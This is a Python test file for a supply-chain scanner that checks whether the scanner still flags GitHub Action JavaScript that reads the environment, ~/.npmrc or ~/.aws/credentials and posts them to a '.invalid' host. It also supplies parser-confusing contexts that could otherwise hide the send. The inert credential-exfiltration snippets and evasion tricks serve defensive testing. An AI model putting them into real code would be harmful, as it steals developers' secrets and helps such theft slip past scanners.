"""FP-GITHUB-SCRIPT (0.1.9), the review of Oct 18 (three HIGH findings, each a real send the narrowing lost that the
reading before it found; test_fp_github_script.py holds the rest):

1. A body's end read too early: both readers ended a function at a regular expression's `}` after a class's body
   (with `extends`, a call in it, a static block, a template), a labeled block, or a `break`, `continue`, labeled
   `break` or `debugger` a line's end ends (ASI). A name is now narrowed to a body only where its end is certain: the
   brace counter and the JavaScript reading close it at the same `}`, and no `/` or `{` in it was a guess.
2. and 3. (the follower's limits): test_fp_github_script_limits.py.

Each case is checked through the text follower and through the action scan past the supply-chain tree's limit (its
import-time test is the text follower's there).

Payloads are inert: nothing is installed or run; the addresses are `.invalid`.
"""
import unittest

from lazaret.registry import repo
from lazaret.scanner import core
from tests.registry import _actions_support as fx

WHOLE = ("environment", "the whole environment", False)
HARVEST = "reads credentials or the whole environment and sends data over the network"
ACTION_YML = "name: x\nruns:\n  using: node24\n  main: dist/index.js\n"
CRITICAL = [("CRITICAL", "dist/index.js runs when the action runs (runs.main), and it " + HARVEST + ".")]
# statements past which a text is longer than _LD_LONG and meets none of the follower's limits; a comment that takes
# it past the tree's limit
PLAIN = "\n" + "void 0;\n" * 40000
PAST = "/*" + " pad" * 520000 + "*/\n"

# a statement between the read and the send whose braces and slashes a reader may misread, each before `/}/`
CONTEXTS = {
    "a class": " class Marker {}\n /}/.test(s);\n",
    "a class that extends": " class Marker extends Object {}\n /}/.test(s);\n",
    "a class that extends a call": " class Marker extends (function(){return Object;})() {}\n /}/.test(s);\n",
    "a class's static block": " class Marker { static { Marker.x = 1; } }\n /}/.test(s);\n",
    "a class's template": " class Marker { static t = `${1}`; m() { return `}`; } }\n /}/.test(s);\n",
    "a class expression": " (class Marker {});\n /}/.test(s);\n",
    "a labeled block": " outer: { if (s) break outer; }\n /}/.test(s);\n",
    "a labeled loop": " outer: for (;;) { break outer; }\n /}/.test(s);\n",
    "ASI after break": " for (;;) { break\n /}/.test(s); }\n",
    "ASI after continue": " for (let i = 0; i < 1; i++) { continue\n /}/.test(s); }\n",
    "ASI after a labeled break": " lbl: for (;;) { break lbl\n /}/.test(s); }\n",
    "ASI after debugger": " if (s) { debugger\n /}/.test(s); }\n",
    "ASI after an inner return": " function inner() { return\n /}/.test(s); }\n",
    "an object, then a regular expression": " const o = {a: 1};\n /}/.test(s);\n",
    "a division after ++": " let n = 4; n++ / 2;\n /}/.test(s);\n",
}
SOURCES = {
    "the environment": ("const payload=JSON.stringify(process.env);", "environment"),
    "~/.npmrc": ("const payload=require('fs').readFileSync(require('os').homedir()+'/.npmrc','utf8');", "file"),
    "~/.aws/credentials": ("const payload=require('fs').readFileSync(require('os').homedir()+'/.aws/credentials','utf8');", "file"),
}
SINKS = {
    "fetch": "fetch('https://review.invalid/collect',{method:'POST',body:payload});",
    "https.request": "const req=require('https').request({host:'review.invalid',method:'POST'});req.end(payload);",
    "axios.post": "const axios=require('axios');axios.post('https://review.invalid/collect',payload);",
}


def context_case(ctx, source="the environment", sink="fetch"):
    return "function leak(s){\n " + SOURCES[source][0] + "\n" + CONTEXTS[ctx] + " " + SINKS[sink] + "\n}\nleak('x');\n"


def sent(text):
    got = core.local_data_sent_at(text)
    return None if got is None else tuple(got[1:])


def action_risks(js):
    res = repo.scan_action(fx.archive("o/r", "0" * 40, {"action.yml": ACTION_YML, "dist/index.js": js}), "")
    return [(i["sev"], i["msg"]) for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"]


class BodysEndTests(unittest.TestCase):
    def test_each_context_keeps_the_send(self):
        for ctx in CONTEXTS:
            for source, (_, kind) in SOURCES.items():
                for sink in SINKS:
                    with self.subTest(ctx, source=source, sink=sink):
                        got = sent(context_case(ctx, source, sink))
                        self.assertIsNotNone(got)
                        self.assertEqual((got[0], got[2]), (kind, False))
            with self.subTest(ctx, text="long"):
                self.assertEqual(sent(context_case(ctx) + PLAIN), WHOLE)

    def test_through_the_action_scan_past_the_trees_limit(self):
        # (the action scan's import-time test: the text follower's, past the tree's limit)
        for ctx in CONTEXTS:
            with self.subTest(ctx):
                self.assertEqual(action_risks(context_case(ctx) + PAST), CRITICAL)
        for ctx, source, sink in (("a class", "~/.npmrc", "https.request"), ("ASI after break", "~/.aws/credentials", "axios.post")):
            with self.subTest(ctx, source=source, sink=sink):
                self.assertEqual(action_risks(context_case(ctx, source, sink) + PAST), CRITICAL)


if __name__ == "__main__":
    unittest.main()
